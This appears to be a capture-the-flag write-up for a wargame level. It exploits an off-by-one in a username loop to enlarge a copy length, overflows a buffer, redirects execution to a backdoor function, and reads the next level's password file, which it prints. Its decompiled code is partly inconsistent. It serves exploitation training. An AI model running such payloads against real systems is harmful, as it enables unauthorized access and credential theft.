## level09 (1 byte can make a difference)
```clike=
struct my_struct {
    char    msg[140];
	char    username[40];
	int    msglen;
};

void set_msg(struct my_struct* var1)
{
    char temp[1024];
    
    memset(temp, 0, 128);
    puts(">: Msg @Unix-Dude");
    printf(">>: ");
    fgets(temp, 1024, stdin);
    strncpy(var1->message, temp, var1->msglen);
}

void set_username(struct my_struct* var1)
{
    char temp[140]; // 0x90 - 0x4
    int count;
    
    memset(temp, 0, 16);
    puts(">: Enter your username");
    printf(">>: ");
    fgets(temp, 120, stdin);
    count = 0;
    while (count < 41 && temp[count]) {
		var1->username[count] = name[count];
		count +=1;
	}
}

void handle_msg()
{
    struct my_struct msg;
    
    memset(msg.username, 0, 40);
    msg.msglen = 140;
    set_username(&msg);
    set_msg(&msg);
    puts(">: Msg sent!");
}

int main()
{
        puts("--------------------------------------------\n|   ~Welcome to l33t-m$n ~    v1337        |\n--------------------------------------------");
    return 0;
}
```
Looking at the code, there may be a chance at overflowing `var1->msg` since `strncpy(var1->message, temp, var1->msglen);` does not copy the nullbyte over. However, there are no operations after that action so I dont this it affects the program.

However upon closer inspection, I noticed that in `set_username`, the while loop is ran 41 times instead of 40, which will cause an overwrite on the first byte of `var1->msglen` To verify this, we can look into GDB. As we can see, the first image contains the original value in the rdx register, but the second image shows the overwritten value.

```
# prep input
python -c "print 'B' * 41 + '\n' + 'i' * 100" > /tmp/level09

# launch gdb
gdb level09
b *0x00005555555549c6
lay asm
focus cmd
tty /dev/pts/1
set disassembly-flavor intel
run < /tmp/level09
```
![image](https://hackmd.io/_uploads/B13p_0-Dp.png)

![image](https://hackmd.io/_uploads/H1XHuRWwp.png)

Now, if we change rdx to `0xff` or 255, we should be able to overflow the message variable later when we strncpy in `set_msg`. 

```
# prep input
python -c "print '\xff' * 41 + '\n' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4'" > /tmp/level09

# launch gdb
gdb level09
b *0x55555555491f
b *0x555555554924
lay asm
focus cmd
tty /dev/pts/1
set disassembly-flavor intel
run < /tmp/level09
```

We did infact override the EIP, and the offset was [200](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/?eip-length=100&eip-output-string=Output+string+goes+here). Now we add the address of `secret_backdoor` and we should be finished.

```
# prep input
python -c "print '\xff' * 41 + '\n' + 'B' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1]" > /tmp/level09

# launch gdb
gdb level09
b *0x55555555491f
b *0x555555554924
lay asm
focus cmd
tty /dev/pts/1
set disassembly-flavor intel
run < /tmp/level09
```

```
level09@OverRide:~$ (python -c "print '\xff' * 41 + '\n' + 'B' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1]" ; cat ) | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!
/bin/sh
whoami
end
pwd
/home/users/level09
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE

```
The password for the end user is `j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE`
